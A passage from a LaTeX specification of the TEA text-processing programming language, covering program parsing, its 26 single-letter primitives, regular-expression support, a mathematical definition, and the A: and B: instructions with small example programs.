#(=1-isltnThamu-erg-1, VAULTS:{"vIN":"This is a multi-line\nstring"})
  \end{lstlisting}
  \end{tcolorbox}
  \caption{Sample TEA Program demonstrating most quirks of a non-trivial TEA Program}
  \label{FIG7}
\end{figure}

And the same exact program as in  \textbf{\autoref{LST1}}, when stripped of all TEA comments and other extraneous, non executable stuff, and all new lines delimiting TEA instructions replaced by the standard TEA instruction delimiter, ``\texttt{|}", becomes as what we see in \textbf{\autoref{LST2}}

 \begin{figure}[H]
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program]
  \begin{lstlisting}[language=TEA, caption={TP 2}, label={LST2}, numbers=left]
i: {This is a multi-line
string}|v:vIN|u!:|g:|l:E|x:{1-}|f:^1-i:A:B|l:A|x!:-1|j:C|l:B|i!:"T"|j:E|l:C|q!:
  \end{lstlisting}
  \end{tcolorbox}
  \caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  \label{FIG8}
\end{figure}

In parsing such a program relative to the given TEA grammar (see \textbf{\autoref{SECGRAM}}), one might approach the task thus:

\begin{enumerate}
\item{ Have a TEA Instruction Line list to hold each complete TEA Instruction per entry, in the natural order they appear in the code.

\begin{enumerate}
\item{
To help with dealing with Multi-line strings anywhere within the program, and which are the only reason parsing might become tricky, start by turning all such Multi-line instructions into single line forms. For example, given any such instructions shall be the kind involving Multi-line strings which are mandatorily delimited by either `` \& " or \{ \& \}, then find a means to momentarily substitute newline characters within such explicit strings in the code with some special marker such as a rare character RC. Thus, any such previously Multi-line strings shall take the modified form {...RC..RCRC...} After this transformation, we can comfortably proceed to process the source code as though all instructions either span a whole single line or multiple instructions sit on the same line (delimited of course).
}
\item Start by splitting the modified code by newlines.
\item For each line, check for whether the line is an opaque line or a TEA Instruction Line.
\item{ If opaque ignore and move to the next, otherwise extract the TEA instructions on that line as follows:

\begin{enumerate}
\item{
If the line is an instruction line with only a single TEA Instruction on it, reverse the RC-NL transform above if necessary, then add the instruction to the instruction list. Otherwise if multiple instructions exist on the line (delimited by \texttt{|}), then extract each instruction statement and add it to the instruction list in the exact order in which it appears on the line. 
}
\item {
Finally, once all the instructions have been extracted and stored in an ordered list, perhaps with clear annotation for what kind of instruction it is (for example noting label statements since they shall merely serve for control flow), then proceed to execute the TEA program by operating on the list of instructions. 
}
\end{enumerate}
}
\end{enumerate}

}
\end{enumerate}


\vspace{2em}

A further note concerning specifying literal strings in TEA --- particularly for \textbf{multi-line strings}: note that the method shown above works well where the default string delimiters ``{" and ``}" do not exist inside the body of the multi-line string. However, in case they do, such as in the example hereafter, it is better [for now] to ensure that the entire input is specified as a single line value --- even if in the editor it might wrap to subsequent lines.


  \begin{tcolorbox}[teaterminalstyle, title=TEA Program with Tricky Literal String that Works Fine]
   \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
i!:{ [{ "Name": "<p!:8|t.:|z*:>", "Age": "<n:26:8>", "Description": "<p!:|s:|s:|z:>" },][2] }
  \end{lstlisting}
  \end{tcolorbox}

However, the following might not work as expected\footnote{Until a time in the future when the quirks of all TEA programming are ironed out of the reference runtimes!}...

  \begin{tcolorbox}[teaterminalstyle, title=TEA Program with Tricky Literal String that Works Fine]
   \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
i:{ 
[
{ "Name": "<p!:8|t.:|z*:>", 
"Age": "<n:26:8>", 
"Description": "<p!:|s:|s:|z:>" 
},][2] 
}
  \end{lstlisting}
  \end{tcolorbox}

\vspace{2em}


Generally, one might appreciate the simplicity of parsing, validating and then executing TEA program source code by studying the TEA execution process as depicted in the flowchart in  \textbf{\autoref{FIGTEAEXECPROCESS}}:


\begin{figure}[H]
  \begin{center}
  %\includegraphics[trim=2cm 8cm 2cm 8cm, clip, width=0.9\textwidth,]{resources/pdfs/ProteinSynthesisStateMachine.pdf}\\
   \includegraphics[trim=0cm 1cm 0cm 0cm, clip, width=0.9\textwidth,]{resources/pdfs/TEA_PROGRAM_EXEC_PROCESS.pdf}\\
   \caption{The TEA Program Execution Process.}
  \label{FIGTEAEXECPROCESS}
  \end{center}
\end{figure}


\section{Tea Instruction Set And The Tea Command Primitive Names}

First, let us look at the current reference list of the 26 TEA primitives and their formal names as depicted in \textbf{\autoref{FIGTEAISET}}:


\begin{figure}[H]
  \begin{center}
  %\includegraphics[trim=2cm 8cm 2cm 8cm, clip, width=0.9\textwidth,]{resources/pdfs/ProteinSynthesisStateMachine.pdf}\\
   \includegraphics[trim=0cm 1cm 0cm 0cm, clip, width=0.9\textwidth,]{resources/tea_cs_is.png}\\
   \caption{The TEA Instruction Set (26 TEA Primitives and their names).}
  \label{FIGTEAISET}
  \end{center}
\end{figure}

In the rest of this manuscript, we then fully define each of these primitives, with focus on what purpose each primitive serves in a TEA program, what syntax it expects, as well as the function and semantics associated with it. For best clarity, each primitive shall be treated in its own chapter, but the approach and structure of the specification remains the same across all the 26 TEA primitives.


\subsection{The Tea Command Naming Standard}

Some people shall wonder, and correctly so, \textit{just how did we come up with the useful names for the 26 TEA primitives} as depicted in \textbf{\autoref{FIGTEAISET}}? And there is no simple answer for that except the method and creativity that the inventor of the language utilized during the architecting/design phase of the language, and so, we get a glimpse of the process that went into that task, as explained hereafter:

All TEA commands are essentially verbs - they tell the TEA processor to do something, but also, based on the name and expression of the verb, they also specify or hint at how to do that thing or what exactly to do or not do. Thus, in choosing names for the TEA Instruction Set primitive commands – which, though they might already be easy to call by the names of their constituent TEA primitive letters ``a" to ``z", would better be named suitably to distinguish them from ordinary Latin alphabet letters, and also to help reflect or clarify on their function in TEA. The following 4 guiding principles serve that purpose:


\begin{enumerate}
\item The Command Name must start with the same letter as the TEA command for which it is a name.
\item The Command Name must reflect or hint to the verb or action the command is designed to do, and not be ambiguous.
\item The Command Name must be a single word, preferably in English.
\item The Command Name must be unique across the instruction set, but this already follows from condition \#1 in this list.
\end{enumerate}

Thus, some tricky TEA primitives such as W: might perhaps better be named ``Webify" instead of original proposal to use ``Web", and for U: to be called ``Uniqueify" instead of ``Unique". But, condition \#2 somewhat helps relax or dismiss the need for these renamings if they seem too extreme. However, with the Instruction Set as expressed above, we can boldly say each of the 26 primitive instructions in TEA clearly and non-ambiguously define not only what each instruction does, but also how. Just by looking at the Command name, or even just the command's first letter... Which surely is not just a clean design choice, but also shall serve to make learning, reading and applying TEA programs very easy. Of course, unlike many of not most existing programming languages, the TEA language can boast of having the simplest instruction set, and also one that's very precise in semantics and purpose, and which, with the use of mnemonics such as reading and memorizing the TEA command name map above, becomes readily palatable and learnable even for little kids just learning the alphabet.

\chapter{TEA REGULAR EXPRESSIONS}
\label{SECREGEXP}

Note that, as indicated in the \textbf{\hyperref[SEC1]{Introduction}} --- \textbf{\hyperref[SECNOMEN]{Section \ref{SECNOMEN}}} , \textbf{Regular Expressions} are \textit{a special type of text} that TEA programs recognize while everything else is merely treated as plain text or mere strings. Also, despite the fact that like many programming languages out there, the particular subset of the regular expressions language or standard might vary from implementation to implementation, or from language to language, whereas, for the TEA language in both its native-platform standard as well as the WEB TEA standard can be safely considered to support the common-subset of regular expression rules and syntax as laid out hereafter:


\begin{longtable}{@{}>{\ttfamily}p{0.25\linewidth}p{0.7\linewidth}@{}}
\hline
\multicolumn{2}{c}{\textbf{Character Matching}} \\
\hline
. & Matches any character except newline \\
\textbackslash{}d & Digit (0–9) \\
\textbackslash{}D & Non-digit \\
\textbackslash{}w & Word character (a–z, A–Z, 0–9, \_) \\
\textbackslash{}W & Non-word character \\
\textbackslash{}s & Whitespace (space, tab, newline) \\
\textbackslash{}S & Non-whitespace \\
\hline
\multicolumn{2}{c}{\textbf{Character Classes}} \\
\hline
[abc] & Matches a, b, or c \\
\verb|[^abc]| & Matches any character except a, b, or c \\
\verb|[a-z]| & Matches any lowercase letter from a to z \\
\hline
\multicolumn{2}{c}{\textbf{Quantifiers}} \\
\hline
* & Matches 0 or more repetitions \\
+ & Matches 1 or more repetitions \\
? & Matches 0 or 1 repetition \\
\verb|{n}| & Matches exactly n times \\
\verb|{n,}| & Matches at least n times \\
\verb|{n,m}| & Matches between n and m times \\
\hline
\multicolumn{2}{c}{\textbf{Anchors}} \\
\hline
\verb|^| & Matches start of string \\
\$ & Matches end of string \\
\verb|\b| & Matches word boundary \\
\verb|\B| & Matches non-word boundary \\
\hline
\multicolumn{2}{c}{\textbf{Grouping and Alternation}} \\
\hline
(abc) & Capturing group for abc \\
(?:abc) & Non-capturing group for abc \\
a|b & Matches a or b \\
\hline
\multicolumn{2}{c}{\textbf{Escaping}} \\
\hline
\verb|\| & Escapes special characters (e.g., \texttt{\textbackslash{}.} matches a literal dot) \\
\hline
\end{longtable}


As we shall see when we come to the sections treating of the 26 TEA \textbf{A:} to \textbf{Z:} proper, regular expressions in TEA \textbf{ONLY} get treated as such, in \textbf{specific} sections of a TEA instruction where the instruction \textbf{explicitly expects a regular expression}, and nowhere else. 

For example, if we wrote the code:

\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program Example 1]
  \begin{lstlisting}[language=TEA]
i!:^$
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

The parameter being passed to the \textbf{I!:} instruction is \textbf{always} treated as a string no matter what. Thus, the attempt to have the command treat the argument ``\verb|^$|" as though it were a regular expression --- in case that is what the programmer thought or wanted, is futile here. In this case, since \textbf{I!:} is the \textbf{INTERACT} instruction that sets its parameter as the explicit instruction output if provided, shall result in that TEA program returning the value ``\verb|^$|" as the output.

Similarly, the following program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program Example 2]
  \begin{lstlisting}[language=TEA]
d!:^$
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

Shall treat whatever is passed to the \textbf{D!:} instruction as a regular expression no matter what, so that, this program --- as we shall come to understand after studying the semantics of \textbf{D:}, the \textbf{DELETE} TEA primitive in \textbf{\hyperref[CHAPD]{Chapter \ref{CHAPD}}}, in its \textbf{D!:} form, shall eliminate from whatever active input occurred before it, everything but what matches the specified regular expression pattern --- in this case ``\verb|^$|", and so that, the instruction shall always return nothing but ``" when used as specified in that program.

Also, talking of the quirks of regular expressions in TEA, note that with experience and experimentation, one comes to learn how best to write or pass regular expressions to a TEA instruction or program. For example, given that the ``\verb$|$" character is treated as the special TEA instruction delimiter (especially for one-liners or minified TEA programs that might not delimit each instruction using the newline character), trying to write or pass a correct regular expression such as ``a\verb$|$b" might be tricky. Take the following example program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program Example 3]
  \begin{lstlisting}[language=TEA]
i!:Hello World | d!:e|l
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

That program attempts to use the \texttt{d!:e|l} instruction to keep only things in the input that either match either ``e" or ``l", however, using or writing the necessary regular expression as shown will result in the output ``e" since the TEA program is interpreted as though the last ``\verb#|#" were a TEA instruction delimiter\footnote{More about this was covered well in \textbf{\hyperref[SECGRAM]{Section \ref{SECGRAM}}}.}, so that the final part of the regular expression --- ``l", gets discarded as extraneous non-executable text or a \textbf{TEA Opaque Expression}. Thus, to correctly use such a tricky/special regular expression, that program would need to be re-written as such:



\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program Example 3]
  \begin{lstlisting}[language=TEA]
i!:Hello World | d!:{e|l}
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

Which then returns the output ``elll" given what we forced the input to be with \texttt{i!:Hello World}.

Concerning this matter, note that still, and despite regular expressions being a special case in TEA programs, and yet, \textbf{in the simplest sense}, TEA regular expressions are still nothing but mere strings/text! The last example above shall help illustrate this given the fact that we use the TEA string delimiters ``\{" and ``\}" to correctly contain the regular expression string parameter that we intend to pass to the \texttt{D!:} instruction.

Thus, though \textbf{the signature} of a TEA instruction shall determine which sections or positional-arguments of a TEA instruction can/are regular expressions and which are not, and yet, when expressing them in code, TEA regular expressions can be treated as though they were normal TEA strings\footnote{\textbf{IMPORTANT} to note that this likewise applies to other \textit{special types} in TEA instructions such as \textbf{block names} --- used with branching instructions such as \texttt{F:REGEX:lBLOCK} and \texttt{J:lBLOCK}, as well as \textbf{vault names} --- used with vault/memory referencing instructions such as \texttt{r*:vNAME:REGEX:SUBSTR}}.





\chapter{TEA and The Mathematics of TRANSFORMATICS}
\label{SECTRANSFORM}


TEA is based on The Mathematics of Transformatics\cite{Lutalo2025_transformatics_thesis}. 

\vspace{1em}



The project's GitHub homepage\cite{cli_tttt} does offer a sufficient plain-English definition of the language in its introduction, and we have already looked at the language's Computer-Science/Regular Language definition in \textbf{\hyperref[SEC2]{Chapter \ref{SEC2}}}, but, we shall also augment or deviate from either, by also considering \textbf{the mathematical definition of the TEA computer programming language}, which we present for the first-time here as:\\



\begin{defn}[The \textbf{Transforming Executable Alphabet}, TEA language]
\label{DEFTEA}

TEA is the Transforming Executable Alphabet\cite{lutalo2024software}; a general-purpose [computer] programming language that is Text-Processing oriented, enables a sequence-transformer chaining paradigm\cite{Lutalo2025_transformatics_thesis}, and which is designed based on a set of 26, decorated and/or qualified single-letter primitives, A: to Z: (or rather a: to z:) which are based on the standard Latin Alphabet; {A,B,C,...,Z}\cite{Lutalo2024TEATAZ}.

\vspace{1em}

And so that, a \textbf{TEA program}, $\mathbb{T}^n$, is an ordered sequence of $n$ sub-sequences $t_{i \in [1,n]}$ --- also known as \textbf{TEA Instructions}(TI) that are any valid self-contained individual instruction expressions in the \textbf{TEA language}, and which are then applied to some initial input $I_0: I_0 \equiv \emptyset \quad \lor \quad I_0 \neq \emptyset$, also known as the \textbf{TEA Input}, and such that, by processing or executing the higher-order sequence $\mathbb{T}^n$, we finally produce some sequence, $O: O \equiv I_0 \quad \lor \quad O \neq I_0$, via a processing (with or without branching), of the chain of contained TEA instructions expressed by each of the $n$ sub-sequences/sub-expressions $t_i$. 

\vspace{1em}

Equivalently, we produce $O$ given some $I_0$, by applying $\mathbb{T}^n$ to it as such:

\begin{trans}
\label{TRANSDEFTEA}
$I_0 \xrightarrow{t_1} I_1 \xrightarrow{t_2} I_2 \cdots  \xrightarrow{t_i} I_{i+1} \cdots \xrightarrow{t_n} I_{n+1} = O;$\\
$\forall t_i \in \mathbb{T}^n$
\end{trans}



And more succinctly:

\begin{trans}
\label{TRANSDEFTEAB}
$I_0 \xrightarrow{\mathbb{T}^n} I_{n+1} = O$
\end{trans}

\end{defn}


If you have come across the new/emerging mathematical theory of Transformatics\cite{Lutalo2025_transformatics_thesis}, which also is the mathematical subdiscipline that treats of especially ordered sequences of both lower-order\cite{Lutalo2025_transformatics_thesis} (sets, lists, flat-sequences) and higher-order\cite{Lutalo2025_transformatics_thesis} (dictionaries, matrices, tuples, n-grams, etc), then you shall come to appreciate that much of how the processing, analysis and expression of sequences is done in Transformatics is how data/sequences/text is treated in the TEA language --- refer to \textbf{Proposal 9} presented in \cite{Lutalo2025_transformatics_thesis}. This shall also explain why it is that TEA, the Transforming Executable Alphabet, is considered to be a language whose paradigm is the chaining of sequence-transformers.

\vspace{1em}

In \cite{cli_tttt} is covered well, the matter of the TEA language and its relation to the traditional UNIX/Linux philosophy; of well-designed basic tools such as text processing tools or data transformation utilities, and how they might be composed via ``piping", to help compose complex logical, computational and/or automation solutions to arbitrary problems. \textbf{The mathematics of Transformatics is what really helps generalize these ideas well enough into a logical framework, system or theory devoid of any dependence on particular technologies or applications, and instead focusing on the ideas of sequences, sequence-transformers and their composition and/or application in the perspective of pure and applied mathematics somewhat reminiscent of linear-algebra.}





%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% BEGIN TAZ SECTION
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\chapter{TEA A: TO Z: COMMAND SPACE SPECIFICATION (Introduction)}
\label{SECTAZ}

In the rest of this section, we shall look at the full formal specification as well as some explanatory and/or illustrative notes, as well as several example TEA programs, concerning each one of the 26 \textbf{A:} to \textbf{Z:} TEA primitives, one at a time. For historical purposes, the only other authoritative existing reference material in relation to the TAZ is in a couple of exploratory lectures\footnote{Find the \textbf{TEA: Transforming executable alphabet mini-lectures} series on YouTube: \url{https://youtube.com/playlist?list=PL9nqA7nxEPgulGKWw1L9xEyqgCdEezaKB&feature=shared}} that the language’s inventor gave mostly before this manuscript was originally prepared.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: A
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{A: ANAGRAMMATIZE}
\label{CHAPA}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{ANAGRAMMATIZE}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Compute anagrams
	\item Shuffle lists
	\item Randomize letters
	\item Create randomness
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{A:}}
  \label{TABTAZA}
\end{table}


\section{SEMANTICS of A:}
\label{SECSEMA}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

a: & Set IO as the AI anagrammatized by words \\

\rowcolor{lightgray}\bfseries a:STR & Same as a:, but operating on the string STR \\

 a!: & Set IO as the AI anagrammatized by characters \\
 
\rowcolor{lightgray}\bfseries a!:STR & Same as a!:, but operating on string STR \\

 \makecell[l]{a*:vNAME \\ a*!:vNAME}& The first as a:, the second as a!:, but operating on string in vault vNAME \\
 
 \hline
\end{tabular}
\caption{The Semantics of A:}
\label{TABSEMA}
\end{table}


\section{NOTES about A:}
\label{SECNOTESA}

By the definitions above, the program:



 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: shuffling words in a string]
  %\begin{lstlisting}[language=TEA, caption={TP A1}, label={LSTA1}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB}|a:
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGA1}
\end{figure}


could return “CB BA AB BC” --- note that \textbf{a:} basically shuffles the words in the AI --- which, given TEA only has the two types; regular expressions and strings, we might as well say, \textbf{a:} can shuffle words in a list (where, the items in the list are assumed to be containing no white space in them, and thus can be delimited using white space). 

On the other hand, the related but different program


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: shuffling a list of symbols]
  %\begin{lstlisting}[language=TEA, caption={TP A2}, label={LSTA2}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | a!:
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGA2}
\end{figure}

would return something like “  ABBCB ACB” because \textbf{a!:} shuffles the contents of the AI at character level --- it's like shuffling a list once again, but with the empty string as the delimiter this time.


\section{EXAMPLE APPLICATIONS of A:}
\label{SECEXAMPA}

Because \textbf{A:} allows us to shuffle items in a list, we might use it to construct programs that can be used to make decisions based on a random selection of some item from the list. 

\subsection{EXAMPLE 1: \textbf{HOME ECONOMICS:} Randomly Pick What to Cook}
\label{SECEXAMP1A}

The following program, given a list of food items available, shall help to randomly pick what to cook on a particular day or at any moment it is tasked with making a suggestion:


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: randomly suggest what to cook]
  %\begin{lstlisting}[language=TEA, caption={TP A3}, label={LSTA3}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{BURGER PIZZA OMELETTE RICE PUDDING FRIES 
MEATBALLS}|a:|d:[ ].*$|x:{I think, you make }
#(=I think, you make PUDDING, VAULTS:{})
#(=I think, you make BURGER, VAULTS:{})
   \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA EXAMPLE: Random Meal Recommender}
  \label{FIGA3}
\end{figure}

Note that, like we saw in \textbf{\autoref{SECPARSE}}, the source code of a legitimate TEA program might sometimes contain non-executable lines such as TEA comments --- these being the lines shown in gray color, and which start with the character ``\#". But also, as explained in the section on how to debug TEA programs as well as in the TEA Debugging paper\cite{Lutalo2025debug}, we might sometimes want to demonstrate what is going on or what is expected to be the internal state of a TEA program at either its termination point, or anywhere before that, by placing some illustrative comments such as the last two lines in that program in \textbf{\autoref{FIGA3}}.




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: B
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{B: BASIFY}
\label{SECB}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{BASIFY}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Compute the Lexical Base of input
	\item Reduce input/list to distinct symbols, sorted by their order of first occurrence in the input
	\item Reduce input to distinct symbols, sorted by their lexical/alphabetical order
	\item Implementing FIFOs
	\item Generating lexical keys
	\item Comparing things by their lexical keys
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{B:}}
  \label{TABTAZB}
\end{table}


\section{SEMANTICS of B:}
\label{SECSEMB}


\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 
\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

b: & Set IO as AI reduced to only its unique characters in their order of first occurrence within AI (\textbf{FIFO Base}) \\

\rowcolor{lightgray}\bfseries b:STR & Same as b:, but operating on string STR \\

b!: & Same as b: but with the results sorted in alphabetical order (\textbf{LEXICAL Base}) \\

\rowcolor{lightgray}\bfseries b!:STR & Same as b!: but operating on STR \\

 \makecell[l]{b*:vNAME \\ b*!:vNAME} & The first as b:, the second as b!:, but operating on string in vault vNAME \\
 
 \hline
\end{tabular}
\caption{The Semantics of B:}
\label{TABSEMB}
\end{table}


\section{NOTES about B:}
\label{SECNOTEB}

The \textbf{Lexical Base} of the AI is to be understood as the reduction of the AI to a string made of only the \textbf{unique} characters in AI, and these, then sorted in ascending \textbf{Lexical Order} for B-Inverse otherwise occurring in their order of occurrence.

By the definitions above, the program:


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: computing the symbol FIFO Base of AI]
  %\begin{lstlisting}[language=TEA, caption={TP B1}, label={LSTB1}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | b:
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGB1}
\end{figure}


Should return ``BC A". While  


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: computing LEXICAL Base of AI]
  %\begin{lstlisting}[language=TEA, caption={TP B2}, label={LSTB2}, numbers=left]
  \begin{lstlisting}[language=TEA]
i!:{bC CB BA aB} | b!:
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGB2}
\end{figure}

Should return ``ABCab". While,  


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: compute FIFO Base of a literal string]
  %\begin{lstlisting}[language=TEA, caption={TP B3}, label={LSTB3}, numbers=left]
  \begin{lstlisting}[language=TEA]
b:{bC CB BA aB}
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGB3}
\end{figure}


Shall or should return exactly ``bC BAa".

 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: computing LEXICAL Base of data in a vault]
  %\begin{lstlisting}[language=TEA, caption={TP B4}, label={LSTB4}, numbers=left]
  \begin{lstlisting}[language=TEA]
v:vAI:{bC CB 543 12a} | b*!:vAI 
#(=12345BCab, VAULTS:{"vAI":"bC CB 543 12a"})
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGB4}
\end{figure}

Should return ``12345BCab". 


\section{EXAMPLE APPLICATIONS of B:}
\label{SECEXAMPB}

It might be alluring to try and use \textbf{B:} to sort arbitrary things, such as attempting to sort a list of children in a classroom by their ascending birthdays in a particular month, or by the order of their first names, however, it should be worth noting that when \textbf{B:} or \textbf{B!:} process any input, they operate on it as a list of symbols or letters, and not as words --- unlike \textbf{A:}, \textbf{B:} doesn't respect white-space delimiters, and so, the best it can be used for, are cases where the sorting that needs to be done, is entirely based on order of non-compound values --- such as individual symbols, characters, digits or letters.

Thus, when passed a list such as ``10 1 9", we should not expect to get something like ``1 9 10", neither `` 0119", but shall instead get something like ``10 9" --- for ``b:" or `` 019" --- for ``b!:". These, because we are computing \textbf{bases at symbol level}.

With that clarification out of the way, we can then appreciate the following example program that can only be best implemented using \texttt{B!:}

\subsection{EXAMPLE 1: \textbf{NUMERICAL ANALYSIS:} Compute Largest Possible o-SSI Number from Several Arbitrary Sequences}
\label{SECEXAMP1B}

In a paper from April 2025, fut. prof. JWL, while exploring RNGs, came across some interesting properties of certain numbers. In particular, the paper \cite{ossipaper} brought to surface the matter of numerical sequences (particularly those of decimal digits), which, when reduced to their sequence symbol set\cite{transformatics}, retain all their original member digits, but also that, those digits are exactly the same members as make-up the symbol set of the base to which the number sequence belongs --- such as $\psi_{10}$ for numbers in base-10. Such numbers, and sequences or numerical expressions of that kind, he named \textbf{orthogonal symbol set identities} (o-SSI). Of course, it is not just o-SSI sequences (meaning, a sequence $S^n: \invpi(S^n) = \invpi(\psi_{n}) = n \quad \land \quad \psi(S^n) \equiv \psi_n$) that can be reduced to an o-SSI sequence for some base-n, but any sequence, $S^k: \invpi(S^k) = k \geq \invpi(\psi_{n}) = n \quad \land \quad \psi_n(S^k) \equiv \psi_n$ also can. 

And so, a problem might arise... In case we had several arbitrary sequences of numbers --- let us assume we have n sequences, $\langle S_1, S_2, S_3,...,S_n \rangle$, each of arbitrary length, and that any two sequences from that collection might not be of the same length or cardinality, and that their member composition and distribution too might not be the same or similar, but that all these sequences span the same base symbol set --- for simplicity, assuming it is $\psi_{10}$. So, assuming we wanted to determine which of these sequences, such as some $S_m$, such that, when we reduce it to just its \textbf{natural symbol set}\footnote{Refer to \textbf{Definition 5} of \cite{ossipaper}}, and from that natural symbol set --- which might or might not be equivalent to $\psi_{10}$, further reduce it to a pure number, $P_{S_m}$. We then know as a fact, that if indeed $\invpi(\psi_{10}(S_m)) = Max(\invpi(\psi_{10}(S_i)) \forall i \in [1,n])$, then that number, if its elements are sorted in descending order of their first occurrence within $\psi_{10}$, shall be the largest possible given all such numbers we might compute for all the sequences in our collection. And further, that that number, $P_{S_m}$, shall be the largest base-10 o-SSI we can derive from the collection of sequences. Essentially that we want to perform the transformation:

\begin{trans}
\label{TRANSB1}
$\langle S_1, S_2, S_3,...,S_n \rangle \quad  \rightarrow \quad \langle P_{S_1}, P_{S_2}, P_{S_3},..., P_{S_n} \rangle  \quad \xrightarrow{O_{find\_max P_{S_i}}} P_{S_m};\\
\invpi(P_{S_m}) = m\\
\land |P_{S_m}| \geq |P_{S_i}| \quad \forall S_i, i \in [1,n]$ 
\end{trans}

And find $P_{S_m}$ given some or any such collection of sequences. Good enough, in TEA, we have the necessary tools to go about resolving such a problem, and the following basic program solves the first bit of this task: it essentially reduces any input sequence (whether purely numeric or alpha-numeric) to just its unique decimal digits (thus $\psi_{10}(S_i)$), and from that reduced sequence, to just the largest possible decimal pure number based on those digits (thus $P_{S_i}$). So, once we have a sequence of such pure numbers, of course we can determine which of them is the largest, and thus could work backwards to which sequence it was that is its source.


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: compute largest o-ssi from input sequence]
  %\begin{lstlisting}[language=TEA, caption={TP B5}, label={LSTB5}, numbers=left]
  \begin{lstlisting}[language=TEA]
i:{63 285 02517 abc3921 219e}
d!:[0-9]
b!: 
m!:
#(=987653210, VAULTS:{})
   \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA EXAMPLE: Computing Largest o-SSI}
  \label{FIGB5}
\end{figure}

Note that in this example in \textbf{\autoref{FIGB5}}, we have wanted to demonstrate that the input sequence might contain \textit{noise} --- such as non-digit symbols, and so, these are eliminated using some of the TEA commands we shall encounter later, however, irrespective of the input, the result shall always be the largest possible decimal pure number we can form from the natural symbol set of the input under base-10.

Thus, applying this program to a set of various, random inputs as tabulated below, we see that it becomes easy to identify which of the input sequences is $S_m$.



\begin{table}[H]
  \centering
	\begin{tabular}[t]{|c|c|c|c|c|c|}
	\hline
	$i\in[1,n]$& \textbf{\makecell{INPUT:\\$S_i$}} & $S_{10}$ & $\psi_{10}(S_i)$ & $P_{S_i}$ & Rank($ \geq |P_{S_m}|$) \\
	\hline
